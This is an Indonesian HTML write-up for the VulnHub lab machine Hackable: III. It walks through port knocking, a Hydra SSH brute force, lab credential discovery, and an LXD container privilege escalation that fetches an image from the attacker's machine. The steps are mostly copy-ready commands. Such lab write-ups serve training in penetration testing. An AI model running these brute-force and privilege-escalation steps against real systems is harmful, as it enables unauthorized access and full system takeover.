@@ -1,0 +1,779 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Write-Up: Pixel Detective - Hackable III</title>
+    <style>
+        /* === CSS VARIABLES === */
+        :root {
+            --bg-color: #0d1117;
+            --card-bg: #161b22;
+            --text-main: #c9d1d9;
+            --text-muted: #8b949e;
+            --accent-green: #3fb950;
+            --accent-blue: #58a6ff;
+            --accent-red: #f85149;
+            --accent-yellow: #d29922;
+            --accent-purple: #bc8cff;
+            --border-color: #30363d;
+            --code-bg: #010409;
+            --font-main: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            --font-code: 'Consolas', 'Courier New', Courier, monospace;
+        }
+
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+
+        /* === CUSTOM SCROLLBAR === */
+        ::-webkit-scrollbar { width: 10px; height: 10px; }
+        ::-webkit-scrollbar-track { background: var(--bg-color); }
+        ::-webkit-scrollbar-thumb {
+            background: var(--border-color);
+            border-radius: 5px;
+        }
+        ::-webkit-scrollbar-thumb:hover { background: var(--accent-purple); }
+
+        body {
+            background-color: var(--bg-color);
+            color: var(--text-main);
+            font-family: var(--font-main);
+            line-height: 1.6;
+            padding: 20px;
+            background-image: radial-gradient(circle at 90% 10%, rgba(188, 140, 255, 0.05) 0%, transparent 20%);
+            overflow-x: hidden;
+        }
+
+        .container { max-width: 1000px; margin: 0 auto; }
+
+        /* === ANIMASI SCROLL (SLIDE UP & FADE IN) === */
+        .reveal {
+            opacity: 0;
+            transform: translateY(40px);
+            transition: all 0.8s cubic-bezier(0.5, 0, 0, 1);
+            will-change: opacity, transform;
+        }
+
+        .reveal.active {
+            opacity: 1;
+            transform: translateY(0);
+        }
+
+        .reveal.active:nth-child(1) { transition-delay: 0.1s; }
+        .reveal.active:nth-child(2) { transition-delay: 0.2s; }
+        .reveal.active:nth-child(3) { transition-delay: 0.3s; }
+
+        /* === NAVIGATION BAR === */
+        .navbar {
+            display: flex;
+            justify-content: center;
+            gap: 15px;
+            margin-bottom: 30px;
+            background-color: var(--card-bg);
+            padding: 15px;
+            border-radius: 10px;
+            border: 1px solid var(--border-color);
+            box-shadow: 0 4px 15px rgba(0,0,0,0.3);
+            flex-wrap: wrap;
+            animation: slideDown 0.8s ease-out;
+        }
+
+        @keyframes slideDown {
+            from { opacity: 0; transform: translateY(-30px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        .nav-link {
+            text-decoration: none;
+            color: var(--text-muted);
+            font-weight: bold;
+            padding: 10px 20px;
+            border-radius: 6px;
+            transition: all 0.3s ease;
+            border: 1px solid transparent;
+        }
+
+        .nav-link:hover {
+            color: var(--accent-blue);
+            background-color: rgba(88, 166, 255, 0.1);
+            border-color: var(--accent-blue);
+            transform: translateY(-2px);
+        }
+
+        .nav-link.active {
+            color: #fff;
+            background-color: var(--accent-purple);
+            border-color: var(--accent-purple);
+            box-shadow: 0 0 15px rgba(188, 140, 255, 0.6);
+        }
+
+        /* === HEADER === */
+        header {
+            text-align: center;
+            padding: 50px 20px;
+            background: linear-gradient(135deg, #1f2937 0%, #111827 100%);
+            border-radius: 12px;
+            border: 1px solid var(--border-color);
+            margin-bottom: 20px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.5);
+            position: relative;
+            overflow: hidden;
+            animation: slideDown 1s ease-out;
+        }
+
+        header::before {
+            content: '';
+            position: absolute;
+            top: 0; left: 0; width: 100%; height: 4px;
+            background: linear-gradient(90deg, var(--accent-purple), var(--accent-blue), var(--accent-purple));
+            background-size: 200% 100%;
+            animation: gradientMove 3s linear infinite;
+        }
+
+        @keyframes gradientMove {
+            0% { background-position: 100% 0; }
+            100% { background-position: -100% 0; }
+        }
+
+        header h1 {
+            color: var(--accent-purple);
+            font-size: 2.8em;
+            margin-bottom: 10px;
+            text-transform: uppercase;
+            letter-spacing: 3px;
+            text-shadow: 0 0 10px rgba(188, 140, 255, 0.5);
+        }
+
+        header p { color: var(--text-muted); font-size: 1.2em; }
+
+        .badge {
+            display: inline-block;
+            background-color: rgba(88, 166, 255, 0.2);
+            border: 1px solid var(--accent-blue);
+            color: var(--accent-blue);
+            padding: 5px 15px;
+            border-radius: 20px;
+            font-size: 0.9em;
+            font-weight: bold;
+            margin: 10px 5px 0 5px;
+            transition: transform 0.3s, box-shadow 0.3s;
+        }
+
+        .badge:hover {
+            transform: scale(1.05);
+            box-shadow: 0 0 10px rgba(88, 166, 255, 0.5);
+        }
+
+        .badge-purple {
+            background-color: rgba(188, 140, 255, 0.2);
+            border: 1px solid var(--accent-purple);
+            color: var(--accent-purple);
+        }
+
+        .badge-purple:hover {
+            box-shadow: 0 0 10px rgba(188, 140, 255, 0.5);
+        }
+
+        /* === DOWNLOAD SECTION === */
+        .download-section {
+            text-align: center;
+            margin-bottom: 40px;
+            animation: fadeIn 1.2s ease-out;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; }
+            to { opacity: 1; }
+        }
+
+        .btn-download {
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            background: linear-gradient(45deg, var(--accent-purple), var(--accent-blue));
+            color: #fff;
+            padding: 15px 30px;
+            border-radius: 50px;
+            text-decoration: none;
+            font-weight: bold;
+            font-size: 1.1em;
+            box-shadow: 0 4px 15px rgba(188, 140, 255, 0.4);
+            transition: all 0.3s ease;
+            border: none;
+        }
+
+        .btn-download:hover {
+            transform: translateY(-3px) scale(1.05);
+            box-shadow: 0 8px 25px rgba(188, 140, 255, 0.6);
+            background: linear-gradient(45deg, var(--accent-blue), var(--accent-purple));
+        }
+
+        .btn-download svg {
+            width: 24px;
+            height: 24px;
+            fill: currentColor;
+        }
+
+        /* === STEP CARDS === */
+        .step-card {
+            background-color: var(--card-bg);
+            border: 1px solid var(--border-color);
+            border-radius: 10px;
+            padding: 30px;
+            margin-bottom: 30px;
+            transition: transform 0.3s, box-shadow 0.3s, border-color 0.3s;
+            position: relative;
+        }
+
+        .step-card:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 8px 25px rgba(0,0,0,0.6);
+            border-color: var(--accent-purple);
+        }
+
+        .step-card::before {
+            content: attr(data-step);
+            position: absolute;
+            top: -15px;
+            left: 30px;
+            background-color: var(--accent-purple);
+            color: #fff;
+            padding: 5px 15px;
+            border-radius: 20px;
+            font-weight: bold;
+            font-size: 1.2em;
+            box-shadow: 0 4px 10px rgba(188, 140, 255, 0.4);
+            transition: transform 0.3s;
+        }
+
+        .step-card:hover::before {
+            transform: scale(1.1);
+        }
+
+        .step-card h2 {
+            color: var(--accent-purple);
+            border-bottom: 1px solid var(--border-color);
+            padding-bottom: 10px;
+            margin: 15px 0 20px 0;
+            font-size: 1.5em;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .step-card p { margin-bottom: 15px; }
+        .step-card ul { margin-left: 20px; margin-bottom: 15px; }
+        .step-card li { margin-bottom: 8px; }
+
+        /* === CODE BLOCKS === */
+        .code-block {
+            background-color: var(--code-bg);
+            border: 1px solid var(--border-color);
+            border-radius: 8px;
+            padding: 15px;
+            font-family: var(--font-code);
+            color: #e6edf3;
+            overflow-x: auto;
+            margin: 15px 0;
+            position: relative;
+            font-size: 0.95em;
+            cursor: pointer;
+            transition: border-color 0.3s, box-shadow 0.3s;
+        }
+
+        .code-block::before {
+            content: attr(data-lang);
+            position: absolute;
+            top: 0;
+            right: 0;
+            background-color: var(--border-color);
+            color: var(--text-muted);
+            padding: 2px 10px;
+            font-size: 0.75em;
+            border-bottom-left-radius: 8px;
+            border-top-right-radius: 8px;
+            font-family: var(--font-main);
+        }
+
+        .code-block:hover { border-color: var(--accent-green); }
+        .code-block span.copy-hint {
+            display: none;
+            position: absolute;
+            bottom: 5px;
+            right: 10px;
+            font-size: 0.7em;
+            color: var(--accent-green);
+            font-family: var(--font-main);
+            animation: pulse 1.5s infinite;
+        }
+        .code-block:hover span.copy-hint { display: block; }
+
+        @keyframes pulse {
+            0% { opacity: 0.5; }
+            50% { opacity: 1; }
+            100% { opacity: 0.5; }
+        }
+
+        /* === NOTES & ALERTS === */
+        .note, .alert, .success, .warning {
+            padding: 15px 20px;
+            border-radius: 8px;
+            margin: 20px 0;
+            font-size: 0.95em;
+            transition: transform 0.3s;
+        }
+
+        .note:hover, .alert:hover, .success:hover, .warning:hover {
+            transform: translateX(5px);
+        }
+
+        .note { background-color: rgba(88, 166, 255, 0.1); border-left: 4px solid var(--accent-blue); }
+        .alert { background-color: rgba(248, 81, 73, 0.1); border-left: 4px solid var(--accent-red); }
+        .success { background-color: rgba(63, 185, 80, 0.1); border-left: 4px solid var(--accent-green); }
+        .warning { background-color: rgba(210, 153, 34, 0.1); border-left: 4px solid var(--accent-yellow); }
+
+        /* === BUTTONS === */
+        .btn {
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+            background-color: var(--accent-blue);
+            color: #fff;
+            padding: 10px 20px;
+            border: none;
+            border-radius: 6px;
+            cursor: pointer;
+            font-weight: bold;
+            text-decoration: none;
+            transition: all 0.3s ease;
+            margin: 10px 5px;
+            font-size: 1em;
+        }
+
+        .btn:hover { 
+            background-color: #1f6feb; 
+            transform: translateY(-2px);
+            box-shadow: 0 5px 15px rgba(88, 166, 255, 0.4);
+        }
+
+        /* === FLAG SECTION (RESPONSIVE ASCII) === */
+        .flag-container {
+            background: linear-gradient(135deg, rgba(188, 140, 255, 0.15) 0%, rgba(0,0,0,0) 100%);
+            border: 2px dashed var(--accent-purple);
+            border-radius: 12px;
+            padding: 30px;
+            margin-top: 40px;
+            box-shadow: 0 0 20px rgba(188, 140, 255, 0.1);
+            transition: box-shadow 0.3s;
+        }
+
+        .flag-container:hover {
+            box-shadow: 0 0 30px rgba(188, 140, 255, 0.3);
+        }
+
+        .flag-container h3 {
+            color: var(--accent-purple);
+            margin-bottom: 20px;
+            font-size: 1.5em;
+            text-transform: uppercase;
+            letter-spacing: 2px;
+            text-align: center;
+        }
+
+        .flag-box {
+            margin-bottom: 40px;
+        }
+
+        .flag-box h4 {
+            margin-bottom: 10px;
+            font-size: 1.2em;
+        }
+
+        .ascii-art {
+            background-color: #000;
+            border: 1px solid var(--border-color);
+            border-radius: 8px;
+            padding: 15px;
+            overflow-x: auto;
+            margin-bottom: 15px;
+        }
+
+        .ascii-art pre {
+            margin: 0;
+            font-family: var(--font-code);
+            color: #fff;
+            font-size: 0.85em;
+            line-height: 1.1;
+            white-space: pre;
+            display: inline-block;
+        }
+
+        .invite-link {
+            color: var(--accent-green);
+            font-size: 0.9em;
+            font-weight: bold;
+            word-break: break-all;
+            text-decoration: none;
+            transition: color 0.3s;
+        }
+
+        .invite-link:hover {
+            color: #fff;
+            text-decoration: underline;
+        }
+
+        /* === FOOTER === */
+        footer {
+            text-align: center;
+            padding: 30px;
+            color: var(--text-muted);
+            font-size: 0.9em;
+            border-top: 1px solid var(--border-color);
+            margin-top: 50px;
+        }
+
+        /* === RESPONSIVE === */
+        @media (max-width: 600px) {
+            body { padding: 10px; }
+            header { padding: 30px 15px; }
+            header h1 { font-size: 1.8em; letter-spacing: 1px; }
+            .step-card { padding: 20px 15px; }
+            .step-card::before { font-size: 1em; }
+            .btn { width: 100%; justify-content: center; }
+            .flag-container { padding: 15px; }
+            .ascii-art pre { font-size: 0.7em; }
+            .navbar { flex-direction: column; gap: 10px; }
+            .btn-download { width: 100%; padding: 15px; font-size: 1em; }
+        }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        
+        <!-- NAVIGATION BAR -->
+        <nav class="navbar">
+            <a href="index.html" class="nav-link">The Planets: Earth</a>
+            <a href="write2.html" class="nav-link active">Hackable: III</a>
+        </nav>
+
+        <!-- HEADER -->
+        <header>
+            <h1>Pixel Detective</h1>
+            <p>Write-Up: VulnHub - Hackable: III</p>
+            <div>
+                <span class="badge badge-purple">Level: Medium</span>
+                <span class="badge" style="border-color: var(--accent-green); color: var(--accent-green); background-color: rgba(63, 185, 80, 0.2);">Status: Completed</span>
+            </div>
+        </header>
+
+        <!-- DOWNLOAD SECTION -->
+        <div class="download-section">
+            <a href="https://download.vulnhub.com/hackable/hackable3.ova" target="_blank" class="btn-download">
+                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 9h-4V3H9v6H5l7 7 7-7zM5 18v2h14v-2H5z"/></svg>
+                Download hackable3.ova (1.6 GB)
+            </a>
+        </div>
+
+        <!-- STEP 0 -->
+        <div class="step-card reveal" data-step="Langkah 0">
+            <h2>🛠️ Persiapan & Konfigurasi Jaringan</h2>
+            <p>Pastikan mesin virtual Kali Linux dan target (Hackable III) berada di jaringan yang sama. Disarankan menggunakan <strong>Host-Only Adapter</strong> di VirtualBox.</p>
+            <div class="code-block" data-lang="bash">
+                <code># Cek IP Kali<br>ip a</code>
+                <span class="copy-hint">Klik untuk copy</span>
+            </div>
+        </div>
+
+        <!-- STEP 1 -->
+        <div class="step-card reveal" data-step="Langkah 1">
+            <h2>🔍 Information Gathering & Enumerasi Awal</h2>
+            <p>Setelah mesin virtual di-import dan dinyalakan, langkah pertama adalah menemukan IP target dan memindai port yang terbuka.</p>
+            <div class="code-block" data-lang="bash">
+                <code># Temukan IP target<br>sudo netdiscover -r 192.168.56.0/24<br><br># Scan port dengan Nmap<br>nmap -sC -sV -p- 192.168.56.103</code>
+                <span class="copy-hint">Klik untuk copy</span>
+            </div>
+            <div class="note">
+                💡 <strong>Hasil Scan:</strong> Port <strong>22 (SSH)</strong> berstatus <em>filtered</em> (tertutup dari luar), dan Port <strong>80 (HTTP)</strong> terbuka. Ini mengindikasikan adanya mekanisme <em>Port Knocking</em>.
+            </div>
+        </div>
+
+        <!-- STEP 2 -->
+        <div class="step-card reveal" data-step="Langkah 2">
+            <h2>🌐 Enumerasi Web & Mencari Petunjuk</h2>
+            <p>Buka browser dan akses <code>http://192.168.56.103</code>. Lakukan <em>Directory Busting</em> untuk mencari direktori atau file tersembunyi.</p>
+            <div class="code-block" data-lang="bash">
+                <code>dirb http://192.168.56.103/</code>
+                <span class="copy-hint">Klik untuk copy</span>
+            </div>
+            <p>Ditemukan beberapa direktori penting: <code>/backup/</code>, <code>/config/</code>, dan <code>/css/</code>. Cek juga <em>source code</em> halaman utama (Ctrl+U), di sana ada komentar tersembunyi:</p>
+            <div class="code-block" data-lang="html">
+                <code>&lt;!-- "Please, jubiscleudo, don't forget to activate the port knocking when exiting your section..." --&gt;</code>
+                <span class="copy-hint">Klik untuk copy</span>
+            </div>
+        </div>
+
+        <!-- STEP 3 -->
+        <div class="step-card reveal" data-step="Langkah 3">
+            <h2>🔑 Mengumpulkan Kunci Port Knocking</h2>
+            <p>Kita harus menemukan 3 port untuk melakukan <em>Port Knocking</em>.</p>
+            
+            <p><strong>1. Port Pertama (Base64)</strong></p>
+            <p>Buka <code>/config/1.txt</code>. Isinya adalah string Base64 <code>MTAwMDA=</code>. Decode string tersebut:</p>
+            <div class="code-block" data-lang="bash">
+                <code>echo "MTAwMDA=" | base64 -d</code>
+                <span class="copy-hint">Klik untuk copy</span>
+            </div>
+            <p>Hasilnya adalah <strong><code>10000</code></strong>.</p>
+
+            <p><strong>2. Port Kedua (Brainfuck)</strong></p>
+            <p>Buka <code>/css/2.txt</code>. Isinya adalah kode Brainfuck: <code>++++++++++[>+>+++>+++++++>++++++++++<<<<-]>>>------------------....</code>. Gunakan <em>decoder</em> online untuk menerjemahkannya. Hasilnya adalah <strong><code>4444</code></strong> (atau karakter '3' yang berulang).</p>
+
+            <p><strong>3. Port Ketiga (Steganografi)</strong></p>
+            <p>Di direktori <code>/login_page/</code>, terdapat file <code>3.jpg</code>. Unduh dan ekstrak dengan <code>steghide</code> (tekan Enter saat diminta passphrase).</p>
+            <div class="code-block" data-lang="bash">
+                <code>wget http://192.168.56.103/login_page/3.jpg<br>steghide extract -sf 3.jpg</code>
+                <span class="copy-hint">Klik untuk copy</span>
+            </div>
+            <p>Baca file hasil ekstraksi, di sana tertulis port ketiga: <strong><code>65535</code></strong>.</p>
+        </div>
+
+        <!-- STEP 4 -->
+        <div class="step-card reveal" data-step="Langkah 4">
+            <h2>🚪 Port Knocking & Brute Force SSH</h2>
+            <p>Sekarang kita punya urutan portnya: <strong>10000</strong>, <strong>4444</strong>, <strong>65535</strong>. Lakukan <em>Port Knocking</em> untuk membuka port SSH (22).</p>
+            <div class="code-block" data-lang="bash">
+                <code>knock 192.168.56.103 10000 4444 65535<br>nmap -p 22 192.168.56.103</code>
+                <span class="copy-hint">Klik untuk copy</span>
+            </div>
+            <div class="success">
+                ✅ <strong>Berhasil:</strong> Port 22 sekarang berstatus <code>open</code>.
+            </div>
+            <p>Selanjutnya, unduh <em>wordlist</em> dari direktori <code>/backup/</code> dan lakukan <em>brute force</em> menggunakan Hydra dengan username <code>jubiscleudo</code>.</p>
+            <div class="code-block" data-lang="bash">
+                <code>wget http://192.168.56.103/backup/wordlist.txt<br>hydra -l jubiscleudo -P wordlist.txt ssh://192.168.56.103</code>
+                <span class="copy-hint">Klik untuk copy</span>
+            </div>
+            <div class="success">
+                ✅ <strong>Kredensial SSH Ditemukan:</strong><br>
+                Username: <code>jubiscleudo</code><br>
+                Password: <code>onlymy</code>
+            </div>
+        </div>
+
+        <!-- STEP 5 -->
+        <div class="step-card reveal" data-step="Langkah 5">
+            <h2>🚩 User Flag & Lateral Movement</h2>
+            <p>Login ke SSH menggunakan kredensial di atas.</p>
+            <div class="code-block" data-lang="bash">
+                <code>ssh jubiscleudo@192.168.56.103</code>
+                <span class="copy-hint">Klik untuk copy</span>
+            </div>
+            <p>Setelah masuk, cari file tersembunyi di direktori home. Kamu akan menemukan <strong><code>.user.txt</code></strong> (User Flag pertama).</p>
+            <div class="code-block" data-lang="bash">
+                <code>ls -la<br>cat .user.txt</code>
+                <span class="copy-hint">Klik untuk copy</span>
+            </div>
+            <p>Selanjutnya, kita perlu mencari kredensial user lain. Periksa direktori web server:</p>
+            <div class="code-block" data-lang="bash">
+                <code>ls -la /var/www/html/<br>cat /var/www/html/.backup_config.php</code>
+                <span class="copy-hint">Klik untuk copy</span>
+            </div>
+            <p>Di dalam file <code>.backup_config.php</code>, terdapat kredensial untuk user <code>hackable_3</code>.</p>
+            <div class="success">
+                ✅ <strong>Kredensial Database/User Ditemukan:</strong><br>
+                Username: <code>hackable_3</code><br>
+                Password: <code>TrOLLED_3</code>
+            </div>
+            <p>Pindah ke user tersebut:</p>
+            <div class="code-block" data-lang="bash">
+                <code>su hackable_3</code>
+                <span class="copy-hint">Klik untuk copy</span>
+            </div>
+        </div>
+
+        <!-- STEP 6 -->
+        <div class="step-card reveal" data-step="Langkah 6">
+            <h2>👑 Privilege Escalation (LXD Exploit)</h2>
+            <p>Cek identitas user <code>hackable_3</code> dengan perintah <code>id</code>. Kamu akan melihat bahwa user ini adalah anggota grup <strong><code>lxd</code></strong>. Ini adalah celah eskalasi privilege yang sangat ampuh.</p>
+            
+            <p><strong>1. Perbarui Sesi Grup</strong></p>
+            <p>Karena kita baru saja pindah user, kita perlu mengaktifkan grup <code>lxd</code> di sesi terminal saat ini.</p>
+            <div class="code-block" data-lang="bash">
+                <code>newgrp lxd</code>
+                <span class="copy-hint">Klik untuk copy</span>
+            </div>
+
+            <p><strong>2. Build & Transfer Image Alpine</strong></p>
+            <p>Di Kali Linux (bukan di SSH target), build image Alpine untuk LXD, lalu transfer ke target menggunakan Python HTTP Server.</p>
+            <div class="code-block" data-lang="bash">
+                <code># Di Kali Linux:<br>git clone https://github.com/saghul/lxd-alpine-builder.git<br>cd lxd-alpine-builder<br>sudo ./build-alpine<br><br># Jalankan server HTTP<br>python3 -m http.server 8000</code>
+                <span class="copy-hint">Klik untuk copy</span>
+            </div>
+            <p>Di terminal SSH target (masuk ke direktori <code>/tmp</code>), unduh file image tersebut:</p>
+            <div class="code-block" data-lang="bash">
+                <code>cd /tmp<br>wget http://192.168.56.102:8000/alpine-v3.24-x86_64-*.tar.gz</code>
+                <span class="copy-hint">Klik untuk copy</span>
+            </div>
+
+            <p><strong>3. Eksekusi LXD</strong></p>
+            <p>Jalankan perintah berikut di terminal SSH target untuk membuat container dengan hak akses penuh dan me-mount direktori host.</p>
+            <div class="code-block" data-lang="bash">
+                <code>lxd init --auto<br>lxc image import ./alpine-v3.24-x86_64-*.tar.gz --alias myimage<br>lxc init myimage ignite -c security.privileged=true<br>lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true<br>lxc start ignite<br>lxc exec ignite /bin/sh</code>
+                <span class="copy-hint">Klik untuk copy</span>
+            </div>
+
+            <p><strong>4. Ambil Root Flag</strong></p>
+            <p>Setelah masuk ke dalam container (prompt berubah menjadi <code>~ #</code>), akses direktori root host dan baca flag-nya.</p>
+            <div class="code-block" data-lang="bash">
+                <code>cd /mnt/root/root<br>cat root.txt</code>
+                <span class="copy-hint">Klik untuk copy</span>
+            </div>
+        </div>
+
+        <!-- FLAGS SECTION -->
+        <div class="flag-container reveal">
+            <h3>🏁 Flags Ditemukan</h3>
+            
+            <!-- USER FLAG -->
+            <div class="flag-box">
+                <h4 style="color: var(--accent-blue);">1. User Flag</h4>
+                <p style="color: var(--text-muted); font-size: 0.9em; margin-bottom: 15px;">Ditemukan di dalam file <code>/home/jubiscleudo/.user.txt</code> setelah login sebagai user <code>jubiscleudo</code>.</p>
+                
+                <div class="ascii-art">
+                    <pre>
+%                                              ,%&&%#.                                              
+%                                         *&&&&%%&%&&&&&&%                                          
+%                                       &&&&            .%&&&                                        
+%                                     &&&#                 %&&&                                      
+%                                   /&&&                     &&&.                                    
+%                                  %&%/                       %&&*                                   
+%                                 .&&#     (%%(,     ,(&&*     %&&                                   
+%                                 &&%    %&&&&&&&&&&&&&&%&%#    &&&                                  
+%                                 &&%&&&&&&&   #&&&&&*   &&&&&&&%&%                                  
+%                                 &&&&&&&&&&&&&&,   /&&&&&&&&&&&&&&                                  
+%                                 &&&&&&&%                 &&&&&&&&                                  
+%                                  %&&%&&&&              /&&&%&&&%                                   
+%                                 &.%&&% %&&%           &&&& %&&/*&                                  
+%                              &&&&&&&&&&  %&&&&#   %%&&&&  %&&&&&&&&&                               
+%                           /&%&/   *&&&&&&   %&&&&&&%&   &&&&&&.   %&&&.                            
+%                          &&&           &&%&           %%%%          .&&&                           
+%                         &&%                                           &&&                          
+%                        %&&.   *&%&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&%&&    /&&(                         
+%                       /&&#   #&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&*   %&&                         
+%                       &&%    ,&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&%     %&%                        
+%                      &&&      %&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&      %&&                       
+%                      &&&      &&&&&&&&&&&&&&&%&   %&&&&&&&&&&&&&&&%      &&&                       
+%                      %&&&%    &&&&&&&&&&&&&&&&     &&&&&&&&&&&&&&&%    &%&&#                       
+%                        &&&&&&&%&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&                         
+%                           &%&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&%                            
+%                                &&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&%                                 
+%                                *&%&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&                                  
+%                                &&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&%                                 
+%                                 #%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%( 
+                    </pre>
+                </div>
+                <a href="https://www.linkedin.com/in/eliastouguinho/" target="_blank" class="invite-link">
+                    invite-me: https://www.linkedin.com/in/eliastouguinho/
+                </a>
+            </div>
+
+            <!-- ROOT FLAG -->
+            <div class="flag-box">
+                <h4 style="color: var(--accent-purple);">2. Root Flag</h4>
+                <p style="color: var(--text-muted); font-size: 0.9em; margin-bottom: 15px;">Ditemukan di dalam direktori <code>/root/root.txt</code> setelah berhasil melakukan eskalasi hak akses (LXD).</p>
+                
+                <div class="ascii-art">
+                    <pre>
+░░█▀░░░░░░░░░░░▀▀███████░░░░
+░░█▌░░░░░░░░░░░░░░░▀██████░░░
+░█▌░░░░░░░░░░░░░░░░███████▌░░
+░█░░░░░░░░░░░░░░░░░████████░░
+▐▌░░░░░░░░░░░░░░░░░▀██████▌░░
+░▌▄███▌░░░░▀████▄░░░░▀████▌░░
+▐▀▀▄█▄░▌░░░▄██▄▄▄▀░░░░████▄▄░
+▐░▀░░═▐░░░░░░══░░▀░░░░▐▀░▄▀▌▌
+▐░░░░░▌░░░░░░░░░░░░░░░▀░▀░░▌▌
+▐░░░▄▀░░░▀░▌░░░░░░░░░░░░▌█░▌▌
+░▌░░▀▀▄▄▀▀▄▌▌░░░░░░░░░░▐░▀▐▐░
+░▌░░▌░▄▄▄▄░░░▌░░░░░░░░▐░░▀▐░░
+░█░▐▄██████▄░▐░░░░░░░░█▀▄▄▀░░
+░▐░▌▌░░░░░░▀▀▄▐░░░░░░█▌░░░░░░
+░░█░░▄▀▀▀▀▄░▄═╝▄░░░▄▀░▌░░░░░░
+░░░▌▐░░░░░░▌░▀▀░░▄▀░░▐░░░░░░░
+░░░▀▄░░░░░░░░░▄▀▀░░░░█░░░░░░░
+░░░▄█▄▄▄▄▄▄▄▀▀░░░░░░░▌▌░░░░░░
+░░▄▀▌▀▌░░░░░░░░░░░░░▄▀▀▄░░░░░
+▄▀░░▌░▀▄░░░░░░░░░░▄▀░░▌░▀▄░░░
+░░░░▌█▄▄▀▄░░░░░░▄▀░░░░▌░░░▌▄▄
+░░░▄▐██████▄▄░▄▀░░▄▄▄▄▌░░░░▄░
+░░▄▌████████▄▄▄███████▌░░░░░▄
+░▄▀░██████████████████▌▀▄░░░░
+▀░░░█████▀▀░░░▀███████░░░▀▄░░
+░░░░▐█▀░░░▐░░░░░▀████▌░░░░▀▄░
+░░░░░░▌░░░▐░░░░▐░░▀▀█░░░░░░░▀
+░░░░░░▐░░░░▌░░░▐░░░░░▌░░░░░░░
+░╔╗║░╔═╗░═╦═░░░░░╔╗░░╔═╗░╦═╗░
+░║║║░║░║░░║░░░░░░╠╩╗░╠═╣░║░║░
+░║╚╝░╚═╝░░║░░░░░░╚═╝░║░║░╩═╝░
+                    </pre>
+                </div>
+                <a href="https://linkedin.com/in/eliastouguinho" target="_blank" class="invite-link">
+                    invite-me: linkedin.com/in/eliastouguinho
+                </a>
+            </div>
+            
+            <p style="margin-top: 25px; color: var(--text-muted); text-align: center;">Selamat! Anda telah menyelesaikan tantangan Hackable: III dan mendapatkan kedua flag.</p>
+        </div>
+
+        <!-- FOOTER -->
+        <footer>
+            <p>&copy; 2026 Pixel Detective. Write-Up by <strong>Pixel</strong>.</p>
+            <p>Materi pembelajaran CTF & Penetration Testing.</p>
+        </footer>
+    </div>
+
+    <!-- === JAVASCRIPT === -->
+    <script>
+        // 1. Fitur Copy-to-Clipboard untuk Code Blocks
+        document.querySelectorAll('.code-block').forEach(block => {
+            block.addEventListener('click', () => {
+                const text = block.querySelector('code').innerText;
+                navigator.clipboard.writeText(text).then(() => {
+                    const originalColor = block.style.borderColor;
+                    block.style.borderColor = 'var(--accent-green)';
+                    block.style.boxShadow = '0 0 10px rgba(63, 185, 80, 0.3)';
+                    
+                    setTimeout(() => {
+                        block.style.borderColor = originalColor;
+                        block.style.boxShadow = 'none';
+                    }, 500);
+                }).catch(err => {
+                    console.error('Gagal menyalin teks: ', err);
+                });
+            });
+        });
+
+        // 2. Animasi Scroll Reveal menggunakan Intersection Observer
+        const revealElements = document.querySelectorAll('.reveal');
+
+        const revealObserver = new IntersectionObserver((entries, observer) => {
+            entries.forEach(entry => {
+                if (entry.isIntersecting) {
+                    entry.target.classList.add('active');
+                    observer.unobserve(entry.target);
+                }
+            });
+        }, {
+            threshold: 0.1,
+            rootMargin: "0px 0px -50px 0px"
+        });
+
+        revealElements.forEach(el => {
+            revealObserver.observe(el);
+        });
+
+        console.log("Hackable III Write-Up Loaded Successfully with Download Link!");
+    </script>
+</body>
+</html>
